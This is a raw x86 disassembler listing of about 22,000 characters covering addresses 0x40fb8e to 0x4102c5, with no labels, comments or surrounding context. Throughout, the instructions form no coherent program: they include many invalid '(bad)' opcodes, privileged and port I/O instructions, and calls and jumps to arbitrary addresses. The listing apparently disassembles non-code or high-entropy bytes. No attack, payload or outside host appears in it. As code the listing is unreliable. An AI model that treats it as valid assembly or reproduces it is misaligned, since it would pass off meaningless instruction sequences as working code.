  40fb8e:	fcomp  DWORD PTR [ebx+0x5c]
  40fb91:	or     DWORD PTR [eax-0x76],edi
  40fb94:	mov    ?,WORD PTR [ebp-0x7c]
  40fb97:	add    cl,BYTE PTR [edx+0x5cb7464c]
  40fb9d:	cmp    ch,BYTE PTR [ecx-0x15]
  40fba0:	adc    DWORD PTR [edi+edi*2+0xb],eax
  40fba4:	pop    es
  40fba5:	dec    esi
  40fba6:	xchg   ebx,eax
  40fba7:	lock xor eax,0xf925b42c
  40fbad:	nop
  40fbae:	sahf   
  40fbaf:	call   0x2d6d49f5
  40fbb4:	jle    0x40fb71
  40fbb6:	out    dx,eax
  40fbb7:	fcom   QWORD PTR [ebx]
  40fbb9:	addr16 pop esp
  40fbbb:	mul    BYTE PTR [esi-0x1c]
  40fbbe:	dec    ebx
  40fbbf:	stos   DWORD PTR es:[edi],eax
  40fbc0:	and    al,0x2d
  40fbc2:	sub    DWORD PTR [eax+0x12],edx
  40fbc5:	and    dl,BYTE PTR [esi-0x5]
  40fbc8:	pop    ebp
  40fbc9:	adc    esi,DWORD PTR [ecx+0x6993c3bd]
  40fbcf:	ss sahf 
  40fbd1:	cmp    eax,0x6adda6f
  40fbd6:	mov    ch,0x19
  40fbd8:	xchg   esi,eax
  40fbd9:	jae    0x40fb71
  40fbdb:	and    cl,BYTE PTR [eax+0x3d]
  40fbde:	loop   0x40fc37
  40fbe0:	test   al,bh
  40fbe2:	sbb    eax,0xf4c5188
  40fbe7:	popf   
  40fbe8:	pop    esi
  40fbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbea:	pop    es
  40fbeb:	mov    al,0x9
  40fbed:	test   BYTE PTR ds:0xdd88377c,bl
  40fbf3:	mov    DWORD PTR [esi+0x4],esp
  40fbf6:	dec    ecx
  40fbf7:	scas   al,BYTE PTR es:[edi]
  40fbf8:	enter  0x2f4b,0x8c
  40fbfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfd:	sub    al,0x4c
  40fbff:	mov    WORD PTR [esi-0x5e9677e8],?
  40fc05:	push   0x70e9867b
  40fc0a:	push   esp
  40fc0b:	add    esp,DWORD PTR [ebx]
  40fc0d:	mov    cs,WORD PTR [esi+0x18]
  40fc10:	test   DWORD PTR [ecx],ecx
  40fc12:	mov    ah,0xcc
  40fc14:	inc    esp
  40fc15:	ins    DWORD PTR es:[edi],dx
  40fc16:	xchg   esi,eax
  40fc17:	lea    ecx,[edi+eax*4]
  40fc1a:	mov    ds:0x1a02bc84,eax
  40fc1f:	jae    0x40fc89
  40fc21:	les    esi,FWORD PTR [edi+ebx*4-0x24]
  40fc25:	xor    al,0xf7
  40fc27:	jmp    0x93c6da7
  40fc2c:	sub    BYTE PTR [ebp-0x4989f964],dh
  40fc32:	sbb    eax,DWORD PTR [eax-0x609c0e6b]
  40fc38:	outs   dx,BYTE PTR ds:[esi]
  40fc39:	lock add al,0xea
  40fc3c:	or     al,0x7a
  40fc3e:	call   FWORD PTR [eax]
  40fc40:	rcr    BYTE PTR [edx],cl
  40fc42:	jmp    0x440708e4
  40fc47:	adc    eax,0x4913b6fb
  40fc4c:	pop    edx
  40fc4d:	sti    
  40fc4e:	js     0x40fc30
  40fc50:	push   ecx
  40fc51:	push   esi
  40fc52:	and    dl,dh
  40fc54:	lea    edi,[edx-0x1876801d]
  40fc5a:	jbe    0x40fc80
  40fc5c:	scas   eax,DWORD PTR es:[edi]
  40fc5d:	cmp    al,0x98
  40fc5f:	js     0x40fc38
  40fc61:	addr16 xchg esp,eax
  40fc63:	in     eax,dx
  40fc64:	push   0x68
  40fc66:	in     al,dx
  40fc67:	sqrtps xmm6,xmm4
  40fc6a:	ret    0xd4bb
  40fc6d:	adc    eax,0x91145bc4
  40fc72:	fcmovu st,st(4)
  40fc74:	out    0xe3,al
  40fc76:	mov    al,ds:0xc4037df2
  40fc7b:	std    
  40fc7c:	jp     0x40fca1
  40fc7e:	or     eax,0x5eb7b71e
  40fc83:	push   ecx
  40fc84:	popa   
  40fc85:	mov    eax,0x67bf4265
  40fc8a:	push   edx
  40fc8b:	cmp    ah,BYTE PTR [ebp+0x61d92290]
  40fc91:	je     0x40fc60
  40fc93:	rcl    DWORD PTR [ebx],0xe6
  40fc96:	push   ebx
  40fc97:	xor    BYTE PTR [edi-0x3fcf839f],dl
  40fc9d:	lock fs loope 0x40fc53
  40fca1:	sub    DWORD PTR es:[edi],0x5b
  40fca5:	std    
  40fca6:	jns    0x40fc2b
  40fca8:	mov    ebx,0xaf94a04a
  40fcad:	loopne 0x40fc5a
  40fcaf:	cmp    ebp,ebx
  40fcb1:	mov    edx,0x5129b7b
  40fcb6:	add    DWORD PTR [eax+0x15d69888],ecx
  40fcbc:	sbb    eax,0x169d2a47
  40fcc1:	dec    esp
  40fcc2:	cs inc esp
  40fcc4:	sbb    eax,0x61b999ae
  40fcc9:	mov    ebx,0x1a4be1c9
  40fcce:	fstp   DWORD PTR [ebp-0x45]
  40fcd1:	push   esp
  40fcd2:	iret   
  40fcd3:	jmp    0x40fcf1
  40fcd5:	push   ecx
  40fcd6:	out    dx,eax
  40fcd7:	ss and al,0x95
  40fcda:	popf   
  40fcdb:	mov    bl,0xd7
  40fcdd:	sub    eax,0xc978afba
  40fce2:	repnz (bad) [edx-0x7cfc23a7]
  40fce9:	mov    edi,0xd2d65ae0
  40fcee:	stos   BYTE PTR es:[edi],al
  40fcef:	xor    DWORD PTR [edi+0x36443253],ebx
  40fcf5:	sub    eax,DWORD PTR [edi]
  40fcf7:	clc    
  40fcf8:	xchg   esi,eax
  40fcf9:	cdq    
  40fcfa:	cmp    eax,0xa4a65c36
  40fcff:	in     al,dx
  40fd00:	inc    eax
  40fd01:	xchg   DWORD PTR [ebx-0x41],edx
  40fd04:	sub    ebx,DWORD PTR [edi+0x1bc72829]
  40fd0a:	mov    esp,0x99eb7ca8
  40fd0f:	mov    ?,WORD PTR [eax-0x6e]
  40fd12:	sub    DWORD PTR [esi+0x32fc9214],eax
  40fd18:	in     eax,0x83
  40fd1a:	or     bl,cl
  40fd1c:	dec    eax
  40fd1d:	inc    ebp
  40fd1e:	sub    esp,DWORD PTR es:[edi-0xde8844d]
  40fd25:	xor    bh,BYTE PTR [ebp+0x44]
  40fd28:	jmp    0x9303:0x6009f8f6
  40fd2f:	iret   
  40fd30:	sbb    esp,DWORD PTR [esi+0x46]
  40fd33:	(bad)  
  40fd34:	cmp    eax,0x4ae8b2c5
  40fd39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd3a:	in     al,0x9d
  40fd3c:	mov    ebx,0x3284fa9
  40fd41:	(bad)  
  40fd42:	adc    eax,0xa840b800
  40fd47:	mov    al,0x4f
  40fd49:	int    0x6
  40fd4b:	rcl    bh,0x91
  40fd4e:	add    BYTE PTR [eax],bl
  40fd50:	pop    ecx
  40fd51:	es mov ecx,0x3a99de49
  40fd57:	add    ebp,ecx
  40fd59:	and    esp,DWORD PTR [edx+0x76]
  40fd5c:	(bad)  
  40fd5d:	aas    
  40fd5e:	lea    esp,[ecx]
  40fd60:	push   edi
  40fd61:	sbb    esp,DWORD PTR [edx+0x595c11db]
  40fd67:	bnd jb 0x40fddf
  40fd6a:	pop    ebx
  40fd6b:	inc    ebx
  40fd6c:	cwde   
  40fd6d:	mov    dh,0xe
  40fd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd70:	out    0xeb,eax
  40fd72:	dec    edx
  40fd73:	ja     0x40fd88
  40fd75:	(bad)  
  40fd76:	into   
  40fd77:	xor    al,0x2e
  40fd79:	jmp    0x72f5:0x76af81db
  40fd80:	add    DWORD PTR [esi-0x47380098],esi
  40fd86:	retfw  
  40fd88:	xchg   DWORD PTR [ecx],eax
  40fd8a:	inc    esi
  40fd8b:	rcl    bh,0xe9
  40fd8e:	inc    ecx
  40fd8f:	scas   al,BYTE PTR es:[edi]
  40fd90:	not    BYTE PTR [ecx]
  40fd92:	or     edx,DWORD PTR [esi+eax*2]
  40fd95:	xor    ecx,DWORD PTR [esi+esi*2-0x2]
  40fd99:	pushf  
  40fd9a:	pop    ss
  40fd9b:	cmp    BYTE PTR ds:0xbae91b25,ah
  40fda1:	sbb    eax,esp
  40fda3:	jo     0x40fdae
  40fda5:	nop
  40fda6:	ins    DWORD PTR es:[edi],dx
  40fda7:	pop    ebx
  40fda8:	(bad)  
  40fda9:	in     eax,dx
  40fdaa:	ss cs mov esi,0xb10f9258
  40fdb1:	shl    DWORD PTR [edi+0x24d0e4a5],cl
  40fdb7:	stos   DWORD PTR es:[edi],eax
  40fdb8:	scas   eax,DWORD PTR es:[edi]
  40fdb9:	fwait
  40fdba:	mov    al,0xd6
  40fdbc:	(bad)  
  40fdbe:	mov    fs,WORD PTR [ebp+0x1fb04fdc]
  40fdc4:	dec    ebx
  40fdc5:	xchg   edx,eax
  40fdc6:	inc    ebp
  40fdc7:	mov    eax,0xda4342fa
  40fdcc:	cwde   
  40fdcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdce:	outs   dx,DWORD PTR ds:[esi]
  40fdcf:	xor    al,0xcb
  40fdd1:	cli    
  40fdd2:	xchg   edx,eax
  40fdd3:	add    al,0x8
  40fdd5:	sbb    al,0x7
  40fdd7:	sub    DWORD PTR [edi],edx
  40fdd9:	mov    al,ds:0x886024cb
  40fdde:	mov    ebp,0x46132a8f
  40fde3:	sub    DWORD PTR [edx+0x74],esp
  40fde6:	es push edx
  40fde8:	fsubr  st,st(0)
  40fdea:	ret    
  40fdeb:	leave  
  40fdec:	ds sahf 
  40fdee:	or     edx,DWORD PTR [ebp+edi*1-0x367bce7f]
  40fdf5:	and    BYTE PTR [esi-0x57f49402],ah
  40fdfb:	lahf   
  40fdfc:	push   es
  40fdfd:	mov    ch,0x4f
  40fdff:	push   ss
  40fe00:	xchg   ebp,eax
  40fe01:	imul   esi,ebx,0x3a
  40fe04:	cmp    al,BYTE PTR [ecx]
  40fe06:	sub    DWORD PTR [ebp-0x7e],ebp
  40fe09:	lods   eax,DWORD PTR ds:[esi]
  40fe0a:	popa   
  40fe0b:	popf   
  40fe0c:	sbb    al,0x10
  40fe0e:	xchg   cl,al
  40fe10:	in     al,0x69
  40fe12:	jmp    0x40fdb1
  40fe14:	and    ebx,esp
  40fe16:	inc    edi
  40fe17:	mov    dl,0xf9
  40fe19:	pop    es
  40fe1a:	mov    al,ds:0xdb978414
  40fe1f:	rol    ch,0xdf
  40fe22:	jmp    DWORD PTR [ebx-0x6e]
  40fe25:	ins    DWORD PTR es:[edi],dx
  40fe26:	dec    edx
  40fe27:	cwde   
  40fe28:	and    dl,BYTE PTR [esi-0x3fa95576]
  40fe2e:	mov    dh,0x5e
  40fe30:	imul   eax,DWORD PTR [eax],0xffffff82
  40fe33:	xor    ch,BYTE PTR [edi-0x63]
  40fe36:	test   al,0xc8
  40fe38:	xchg   ebx,eax
  40fe39:	(bad)  
  40fe3a:	push   ebx
  40fe3b:	pop    ebp
  40fe3c:	ins    DWORD PTR es:[edi],dx
  40fe3d:	outs   dx,BYTE PTR ds:[esi]
  40fe3e:	cs jb  0x40fded
  40fe41:	repnz imul eax,DWORD PTR [eax],0x49e5bfc8
  40fe48:	mov    esp,0x51fb82b
  40fe4d:	push   ss
  40fe4e:	pop    es
  40fe4f:	sahf   
  40fe50:	retf   0xc132
  40fe53:	stos   BYTE PTR es:[edi],al
  40fe54:	cmc    
  40fe55:	test   DWORD PTR [eax],ebp
  40fe57:	shr    DWORD PTR [ecx+0x5e],1
  40fe5a:	jmp    0x40fe8e
  40fe5c:	sub    BYTE PTR [esi+0x7f],ch
  40fe5f:	sti    
  40fe60:	pop    esi
  40fe61:	inc    ecx
  40fe62:	ins    DWORD PTR es:[edi],dx
  40fe63:	(bad)  
  40fe64:	out    dx,al
  40fe65:	aam    0xe2
  40fe67:	jne    0x40fdf3
  40fe69:	sub    dh,BYTE PTR [eax]
  40fe6b:	jle    0x40fe3d
  40fe6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6e:	xchg   ecx,eax
  40fe6f:	ficomp WORD PTR [ebp*8+0xc253ead]
  40fe76:	jge    0x40feab
  40fe78:	iret   
  40fe79:	dec    ebx
  40fe7a:	push   DWORD PTR ds:0x8e4a9c5a
  40fe80:	inc    edi
  40fe81:	jno    0x40fef4
  40fe83:	aad    0x99
  40fe85:	xchg   ebx,eax
  40fe86:	adc    cl,0x21
  40fe89:	stos   DWORD PTR es:[edi],eax
  40fe8a:	cli    
  40fe8b:	mov    dh,0x21
  40fe8d:	xor    edx,DWORD PTR [eax]
  40fe8f:	aad    0x19
  40fe91:	loope  0x40fee5
  40fe93:	loop   0x40fe3d
  40fe95:	ret    
  40fe96:	ret    0x252b
  40fe99:	and    DWORD PTR ds:0x24408173,edi
  40fe9f:	or     dl,dh
  40fea1:	test   eax,0xedf773d7
  40fea6:	aaa    
  40fea7:	adc    DWORD PTR [ebp-0x80],edi
  40feaa:	ss cmp ebp,ecx
  40fead:	dec    edx
  40feae:	or     ecx,edi
  40feb0:	test   BYTE PTR [edi+0x40faacaf],ch
  40feb6:	call   0x27bce552
  40febb:	adc    DWORD PTR [edx],edx
  40febd:	jmp    0x6d8e615
  40fec2:	scas   al,BYTE PTR es:[edi]
  40fec3:	pop    ebp
  40fec4:	out    0xd6,al
  40fec6:	or     al,0xc4
  40fec8:	clc    
  40fec9:	cmc    
  40feca:	adc    edi,DWORD PTR [esi-0x4a70dafb]
  40fed0:	repnz dec ebx
  40fed2:	mov    ds:0x461b86a9,eax
  40fed7:	cwde   
  40fed8:	pop    edx
  40fed9:	jp     0x40fe82
  40fedb:	xchg   ebp,eax
  40fedc:	xor    BYTE PTR [ecx-0x16],al
  40fedf:	push   edx
  40fee0:	or     ah,BYTE PTR [edi]
  40fee2:	jne    0x40fe90
  40fee4:	ins    BYTE PTR es:[edi],dx
  40fee5:	ins    BYTE PTR es:[edi],dx
  40fee6:	adc    edx,esi
  40fee8:	mov    dh,0xe3
  40feea:	daa    
  40feeb:	(bad)  
  40feec:	sbb    esp,DWORD PTR [edi-0x6b4a3349]
  40fef2:	es icebp 
  40fef4:	into   
  40fef5:	ror    dh,0x62
  40fef8:	lods   al,BYTE PTR ds:[esi]
  40fef9:	jno    0x40ff04
  40fefb:	sub    DWORD PTR [ecx+0x44],esp
  40fefe:	add    al,0xf3
  40ff00:	jno    0x40ff7a
  40ff02:	in     eax,dx
  40ff03:	jmp    ecx
  40ff05:	in     eax,dx
  40ff06:	pop    ecx
  40ff07:	nop
  40ff08:	shr    DWORD PTR [ecx],1
  40ff0a:	dec    eax
  40ff0b:	or     al,BYTE PTR [ebx-0x21]
  40ff0e:	and    DWORD PTR [edi*1-0x56280155],ebx
  40ff15:	add    al,0x87
  40ff17:	dec    esi
  40ff18:	xchg   DWORD PTR [ebp-0x1ade192f],ebx
  40ff1e:	cmp    al,0x51
  40ff20:	in     eax,dx
  40ff21:	aam    0x1d
  40ff23:	stos   BYTE PTR es:[edi],al
  40ff24:	retf   
  40ff25:	lock dec BYTE PTR ds:[ebx-0x48eed304]
  40ff2d:	or     BYTE PTR [edi-0x2c2a4774],ch
  40ff33:	xor    al,ch
  40ff35:	cld    
  40ff36:	xchg   BYTE PTR ds:0xb0fc6b80,cl
  40ff3c:	xchg   edi,eax
  40ff3d:	(bad)  
  40ff3e:	jl     0x40ff37
  40ff40:	inc    ebp
  40ff41:	fsubp  st(2),st
  40ff43:	pop    es
  40ff44:	jns    0x40ff16
  40ff46:	mov    dl,BYTE PTR [edx-0x58]
  40ff49:	arpl   WORD PTR [ebp-0x540a3d1b],si
  40ff4f:	push   ebp
  40ff50:	(bad)  
  40ff51:	cli    
  40ff52:	mov    ch,BYTE PTR ds:0xc2b2e008
  40ff58:	addr16 pop eax
  40ff5a:	aam    0x6e
  40ff5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff5d:	adc    cl,BYTE PTR [ebp+0x74]
  40ff60:	outs   dx,DWORD PTR ds:[esi]
  40ff61:	dec    esp
  40ff62:	pop    DWORD PTR ss:[ebp-0x5ac85036]
  40ff69:	retf   
  40ff6a:	out    0x62,al
  40ff6c:	xchg   ebx,eax
  40ff6d:	add    cl,dl
  40ff6f:	cmc    
  40ff70:	mov    ebx,0x9d91482e
  40ff75:	mov    edx,0xe55ee81
  40ff7a:	js     0x40ff73
  40ff7c:	inc    esp
  40ff7d:	sbb    eax,0x4f273315
  40ff82:	mov    al,bh
  40ff84:	mov    WORD PTR ds:0x4445e5b7,fs
  40ff8a:	(bad)  
  40ff8b:	fwait
  40ff8c:	in     eax,0x79
  40ff8e:	jle    0x40ffa8
  40ff90:	jo     0x40ffd8
  40ff92:	wrmsr  
  40ff94:	mov    edx,0x30146648
  40ff99:	ret    
  40ff9a:	je     0x40ff48
  40ff9c:	cmp    eax,DWORD PTR [eax-0x5]
  40ff9f:	xchg   ebx,eax
  40ffa0:	mov    ecx,ebp
  40ffa2:	(bad)  
  40ffa3:	out    0xc2,al
  40ffa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffa6:	lods   eax,DWORD PTR ds:[esi]
  40ffa7:	(bad)  
  40ffa8:	std    
  40ffa9:	(bad)  
  40ffaa:	mov    dh,0x4a
  40ffac:	addr16 cmc 
  40ffae:	fwait
  40ffaf:	gs int3 
  40ffb1:	push   ecx
  40ffb2:	cmp    eax,DWORD PTR [ebp-0x1c]
  40ffb5:	outs   dx,BYTE PTR ds:[esi]
  40ffb6:	jp     0x40ff92
  40ffb8:	rcr    BYTE PTR [edi+0x7ae1a830],0x44
  40ffbf:	sub    cl,BYTE PTR [ecx]
  40ffc1:	loope  0x40ffe0
  40ffc3:	scas   al,BYTE PTR es:[edi]
  40ffc4:	pop    edx
  40ffc5:	dec    edx
  40ffc6:	sub    ecx,DWORD PTR [eax+0x32]
  40ffc9:	jg     0x40ff75
  40ffcb:	into   
  40ffcc:	ficomp DWORD PTR [esi-0x1d]
  40ffcf:	clc    
  40ffd0:	test   eax,0x7fc4c78
  40ffd5:	pushf  
  40ffd6:	jle    0x410042
  40ffd8:	out    0xee,al
  40ffda:	mov    ch,0xe7
  40ffdc:	das    
  40ffdd:	icebp  
  40ffde:	in     al,dx
  40ffdf:	mov    dh,0x78
  40ffe1:	test   DWORD PTR [esi+0x7f],esp
  40ffe4:	adc    ebp,ecx
  40ffe6:	out    dx,al
  40ffe7:	jmp    0x40ff80
  40ffe9:	aas    
  40ffea:	dec    BYTE PTR [ebx]
  40ffec:	retf   0xcddf
  40ffef:	and    dl,ch
  40fff1:	in     al,0xc5
  40fff3:	dec    ecx
  40fff4:	lahf   
  40fff5:	mov    ebp,0x96317063
  40fffa:	retf   
  40fffb:	mov    ebp,0x16597dbf
  410000:	pop    eax
  410001:	fwait
  410002:	dec    esi
  410003:	or     edx,ebx
  410005:	int    0xbb
  410007:	scas   al,BYTE PTR es:[edi]
  410008:	mov    ah,0xd6
  41000a:	add    edi,DWORD PTR [ebx-0x1c]
  41000d:	outs   dx,BYTE PTR ds:[esi]
  41000e:	in     eax,0xab
  410010:	and    BYTE PTR [ecx],0x54
  410013:	scas   al,BYTE PTR es:[edi]
  410014:	jecxz  0x41007c
  410016:	cmp    DWORD PTR [ebx],edi
  410018:	pop    ecx
  410019:	sbb    cl,BYTE PTR [edx+0x1d]
  41001c:	test   eax,0x8ea14ce4
  410021:	stos   DWORD PTR es:[edi],eax
  410022:	(bad)  
  410023:	and    DWORD PTR [edx-0x71f4f453],ebx
  410029:	and    eax,0x2c7aaf6b
  41002e:	push   ebp
  41002f:	data16 repz mov al,ds:0x951c7eec
  410036:	mov    esp,0x631130fd
  41003b:	call   0xd450c67a
  410040:	xor    eax,0x2ff8b44b
  410045:	repz sbb eax,0xd3290654
  41004b:	outs   dx,DWORD PTR ds:[esi]
  41004c:	mov    edx,0xc79a23ab
  410051:	push   ecx
  410052:	or     BYTE PTR [ecx+ebx*4+0x1a4924a3],dl
  410059:	je     0x41006b
  41005b:	xchg   edx,eax
  41005c:	dec    ecx
  41005d:	call   0xdd6bfcaa
  410062:	push   edi
  410063:	sbb    al,0xd2
  410065:	or     eax,0xb78508a1
  41006a:	pop    ecx
  41006b:	adc    al,0x68
  41006d:	loope  0x410074
  41006f:	mov    WORD PTR [esi+0x1d],gs
  410072:	inc    edx
  410073:	call   0xe1e98b1b
  410078:	lds    eax,FWORD PTR [ebp-0x5da93ab]
  41007e:	lock in al,dx
  410080:	push   esi
  410081:	xor    al,0x57
  410083:	popa   
  410084:	in     eax,dx
  410085:	jne    0x41007f
  410087:	inc    ebx
  410088:	int3   
  410089:	fdivrp st(1),st
  41008b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41008c:	and    BYTE PTR [ebx-0x37],0x33
  410090:	call   0x61be:0x8b196ef2
  410097:	or     BYTE PTR [edi+ecx*4],al
  41009a:	sbb    BYTE PTR [ecx+0x136c1071],dl
  4100a0:	loop   0x4100bc
  4100a2:	jns    0x410045
  4100a4:	clc    
  4100a5:	add    bl,BYTE PTR [esi]
  4100a7:	outs   dx,DWORD PTR ds:[esi]
  4100a8:	call   0x83545d40
  4100ad:	lods   eax,DWORD PTR ds:[esi]
  4100ae:	pop    ebx
  4100af:	inc    esp
  4100b0:	mov    DWORD PTR [ebp+0x2c4cf514],ebx
  4100b6:	pop    es
  4100b7:	repnz clc 
  4100b9:	adc    al,0x65
  4100bb:	and    DWORD PTR [ecx],ebx
  4100bd:	call   0x8b05e490
  4100c2:	pop    esi
  4100c3:	(bad)  
  4100c4:	fist   WORD PTR cs:[ecx+0x49743083]
  4100cb:	add    ebp,DWORD PTR [ecx]
  4100cd:	repz mov ebx,0x9f4ffb24
  4100d3:	mov    BYTE PTR [eax+0x4ff53e7f],bh
  4100d9:	and    al,0x3e
  4100db:	dec    edx
  4100dc:	push   ebp
  4100dd:	stos   DWORD PTR es:[edi],eax
  4100de:	ja     0x410118
  4100e0:	dec    ecx
  4100e1:	jmp    0xad299956
  4100e6:	jb     0x4100bf
  4100e8:	test   al,0xd5
  4100ea:	fwait
  4100eb:	sbb    DWORD PTR [edi-0x4e3770c5],ebp
  4100f1:	ror    edi,0x8
  4100f4:	adc    DWORD PTR es:0x9b0f2051,ebp
  4100fb:	in     eax,dx
  4100fc:	(bad)  
  4100fd:	push   esp
  4100fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ff:	cs cmp al,0x9f
  410102:	icebp  
  410103:	pop    ecx
  410104:	jnp    0x4100c4
  410106:	or     DWORD PTR [ebx],ecx
  410108:	pop    ebx
  410109:	push   0xffffff95
  41010b:	jge    0x4100ff
  41010d:	lds    esp,FWORD PTR [ebx-0x62]
  410110:	jne    0x410121
  410112:	and    al,0x3b
  410114:	cld    
  410115:	xor    edx,ecx
  410117:	ret    0x3cd7
  41011a:	push   ss
  41011b:	adc    DWORD PTR [ecx+0xe],eax
  41011e:	je     0x410197
  410120:	cli    
  410121:	mov    ds:0x116bf7f,eax
  410126:	dec    ebp
  410127:	sbb    ebp,DWORD PTR [edi]
  410129:	icebp  
  41012a:	out    dx,al
  41012b:	xchg   edx,eax
  41012c:	add    al,bh
  41012e:	or     eax,0x8d373303
  410133:	jmp    ebp
  410135:	lods   eax,DWORD PTR ds:[esi]
  410136:	not    DWORD PTR [ecx]
  410138:	mov    ecx,0xdc73db46
  41013d:	imul   eax,DWORD PTR [eax],0xffffffbe
  410140:	jl     0x4100c8
  410142:	scas   al,BYTE PTR es:[edi]
  410143:	lock inc esi
  410145:	in     eax,dx
  410146:	ja     0x4101af
  410148:	hlt    
  410149:	inc    ecx
  41014a:	fimul  WORD PTR [ebp+0x13]
  41014d:	std    
  41014e:	repz leave 
  410150:	out    0x86,eax
  410152:	xchg   edx,eax
  410153:	sbb    al,0x86
  410155:	push   0xd92691a6
  41015a:	push   edi
  41015b:	popf   
  41015c:	push   esi
  41015d:	fdivr  st(4),st
  41015f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410160:	das    
  410161:	jmp    0x5fc4a9af
  410166:	retf   
  410167:	inc    esp
  410168:	aad    0x1b
  41016a:	pushf  
  41016b:	sub    DWORD PTR [esi],ebp
  41016d:	mov    dh,0x5c
  41016f:	push   edx
  410170:	xchg   edi,eax
  410171:	cmp    DWORD PTR [edx-0xa9b93ce],eax
  410177:	dec    edi
  410178:	xor    DWORD PTR [ebx+0x68],edi
  41017b:	mov    ebx,0x367aaaf9
  410180:	(bad)  
  410181:	jmp    0x7433b9cb
  410186:	xor    al,0x71
  410188:	add    eax,0x19129505
  41018d:	xchg   esp,eax
  41018e:	arpl   WORD PTR [edx],si
  410190:	jb     0x4101c5
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	xchg   edi,eax
  410194:	call   0xebb7b2a8
  410199:	repz or BYTE PTR [ebp+0x49],ah
  41019d:	(bad)  
  41019e:	jne    0x4101b7
  4101a0:	mov    esi,0x8e627f3a
  4101a5:	and    al,0x49
  4101a7:	test   ebx,ebx
  4101a9:	ins    DWORD PTR es:[edi],dx
  4101aa:	mov    cl,0x56
  4101ac:	push   ds
  4101ad:	out    0xe6,al
  4101af:	outs   dx,BYTE PTR ds:[esi]
  4101b0:	xchg   ebp,eax
  4101b1:	iret   
  4101b2:	xor    al,0x76
  4101b4:	std    
  4101b5:	sub    eax,0xc427b3f0
  4101ba:	bnd jle 0x410228
  4101bd:	pop    ebx
  4101be:	mov    ds:0x71c3279e,eax
  4101c3:	shl    eax,cl
  4101c5:	xor    al,0x2c
  4101c7:	in     al,dx
  4101c8:	leave  
  4101c9:	mov    esp,0x58b3f30
  4101ce:	mov    bl,BYTE PTR ds:0x8eb7288e
  4101d4:	pusha  
  4101d5:	push   esi
  4101d6:	pop    ecx
  4101d7:	icebp  
  4101d8:	les    esp,FWORD PTR [edx]
  4101da:	xor    BYTE PTR [eax],al
  4101dc:	and    DWORD PTR [edi-0x23dfd03a],eax
  4101e2:	stc    
  4101e3:	fld    QWORD PTR [ebx+0x11]
  4101e6:	inc    edx
  4101e7:	pushf  
  4101e8:	jle    0x4101a3
  4101ea:	nop
  4101eb:	jp     0x4101d3
  4101ed:	xor    al,0xd9
  4101ef:	adc    DWORD PTR [ebp-0x4a],esp
  4101f2:	sbb    ecx,DWORD PTR [eax+0x71b3a5d2]
  4101f8:	adc    ecx,ebp
  4101fa:	nop
  4101fb:	fbstp  TBYTE PTR [eax]
  4101fd:	push   ds
  4101fe:	xchg   esi,eax
  4101ff:	inc    ebx
  410200:	xchg   edi,eax
  410201:	push   ecx
  410202:	ret    
  410203:	pop    es
  410204:	cmp    dl,BYTE PTR [edi]
  410206:	outs   dx,DWORD PTR ds:[esi]
  410207:	pusha  
  410208:	js     0x410283
  41020a:	mov    edi,0x235f23a3
  41020f:	in     eax,dx
  410210:	lea    esi,[ebp-0x64]
  410213:	mov    bl,0xbd
  410215:	mov    cs,WORD PTR [edx-0x2c41653a]
  41021b:	jle    0x4101ca
  41021d:	jae    0x410243
  41021f:	lods   al,BYTE PTR ds:[esi]
  410220:	lods   al,BYTE PTR ds:[esi]
  410221:	sub    BYTE PTR [edx-0x32],ah
  410224:	ins    DWORD PTR es:[edi],dx
  410225:	arpl   dx,sp
  410227:	cmp    bl,BYTE PTR [edx+0x6c]
  41022a:	(bad)  
  41022b:	adc    al,0xbc
  41022d:	inc    esp
  41022e:	int    0x7b
  410230:	shl    bh,1
  410232:	dec    eax
  410233:	lahf   
  410234:	mov    al,0x63
  410236:	lods   al,BYTE PTR ds:[esi]
  410237:	cmp    bp,WORD PTR [edi+0x45a15502]
  41023e:	jg     0x4101f2
  410240:	xchg   edi,eax
  410241:	sbb    bl,bl
  410243:	pop    esi
  410244:	icebp  
  410245:	sahf   
  410246:	and    al,0x7d
  410248:	and    BYTE PTR [eax],ch
  41024a:	shl    DWORD PTR [ebp-0x638676b],1
  410250:	mov    ebp,0x2e19d871
  410255:	(bad)  
  410256:	out    0xc3,al
  410258:	cmp    ah,BYTE PTR [edi+0x600871fc]
  41025e:	(bad)  
  41025f:	fsub   st(6),st
  410261:	push   esp
  410262:	jle    0x4102ce
  410264:	int3   
  410265:	push   edi
  410266:	push   esi
  410267:	mov    ds:0x4a34fcc9,al
  41026c:	sbb    al,0x95
  41026e:	sbb    edi,ebp
  410270:	sub    DWORD PTR [esi],ecx
  410272:	mov    bl,0xf3
  410274:	stc    
  410275:	and    ah,ah
  410277:	std    
  410278:	ror    BYTE PTR [esi+0x44],cl
  41027b:	sbb    esp,ecx
  41027d:	scas   al,BYTE PTR es:[edi]
  41027e:	mov    ebx,0x9e6fcaa
  410283:	and    DWORD PTR [ecx+0x58],ebp
  410286:	ja     0x41022e
  410288:	arpl   sp,sp
  41028a:	cli    
  41028b:	jae    0x41027f
  41028d:	jl     0x410296
  41028f:	call   0x7988d0c8
  410294:	fs mov esi,0xb7e776af
  41029a:	mov    cl,0x90
  41029c:	(bad)  
  41029e:	sbb    al,0x1
  4102a0:	dec    ebp
  4102a1:	jae    0x410266
  4102a3:	gs test bl,ah
  4102a6:	jl     0x4102ba
  4102a8:	adc    eax,0xa9121204
  4102ad:	or     al,0x2c
  4102af:	ins    DWORD PTR es:[edi],dx
  4102b0:	ins    DWORD PTR es:[edi],dx
  4102b1:	dec    eax
  4102b2:	ins    DWORD PTR es:[edi],dx
  4102b3:	add    DWORD PTR [edi-0x42],esp
  4102b6:	xor    dh,BYTE PTR [ebx+0x4b0393ba]
  4102bc:	adc    dh,bl
  4102be:	test   DWORD PTR [edx],0x30721298
  4102c4:	pop    ds
  4102c5:	or     ah,al
